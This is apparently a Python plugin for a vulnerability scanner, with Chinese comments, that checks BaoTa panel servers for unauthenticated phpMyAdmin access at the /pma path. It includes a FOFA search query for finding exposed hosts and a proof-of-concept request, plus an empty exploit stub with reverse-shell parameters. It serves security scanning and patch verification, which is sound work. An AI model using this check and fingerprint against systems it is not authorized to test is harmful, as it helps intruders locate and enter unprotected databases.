# -*- coding: UTF-8 -*-
#!/usr/bin/python
import requests
def vuln_info():
    info={
        'vuln_name': 'phpmyadmin未授权',  #漏洞名称
        'vuln_referer':'https://www.cnblogs.com/liujizhou/p/13550758.html',  #漏洞来源
        'vuln_author':'qianxiao996',  #插件作者
        'cms_name':'宝塔',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''宝塔Linux面板7.4.2版本和Windows面板6.8版本存在phpmyadmin未授权访问漏洞
漏洞未phpmyadmin未鉴权，可通过特定地址直接登录数据库的漏洞。
漏洞URL：http://ip:888/pma      即可直接登录（但要求必须安装了phpmyadmin）''',
        'vuln_identifier':'''无''',
        'vuln_class':'未授权访问',#如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution':'''Linux用户升级至最新版本7.4.3，windows用户升级至6.9''',
        'FofaQuery_link':'/pma', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery':'body="常规设置"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc
        'isexp':0  #是否有exp
    }
    return info
# url：url  hostname：主机地址  port：端口  scheme：服务  heads：http自定义头信息
def do_poc(url,hostname,port,scheme,heads={}):
    # 返回参数
    #Result返回是否存在，
    #Result_Info为返回的信息，可以为Paylaod 
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
    result = {"Result":False,"Result_Info":"payload","Debug_Info":"","Error_Info":""}
    bug = '/pma'
    url = url + '/'+bug
    try:
        r = requests.get(url,timeout=5,headers=heads)
        zt = r.status_code
        if zt == 200:
            r_bianma = r.content
            r_doc = str(r_bianma,'utf-8')
            demo = '常规设置'
            good = demo in r_doc
            if good == True:
                result['Result']= True
                result['Result_Info']= '存在'
            else:
                result['Result']= False
        else:
            result['Debug_Info']='返回状态码:'+str(zt)
    except Exception as e:
        result['Error_Info']=str(e)+str(e.__traceback__.tb_lineno)+'行'
    return result
    
# url:url   heads:自定义请求头 exp_type:两个选项（cmd,shell） exp_cmd：命令执行的命令 lhost：反弹shell的IP lport：反弹shell的端口
def do_exp(url,heads={},exp_type='cmd',exp_cmd='whoami',lhost='127.0.0.1',lport=8888):
    # 返回参数
    #Result返回是否成功，
    #Result_Info为返回的信息，可以为Paylaod 
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
    result = {"Result":False,"Result_Info":"payload","Debug_Info":"","Error_Info":""}
    result['Debug_Info'] = "暂无exp"
    return result
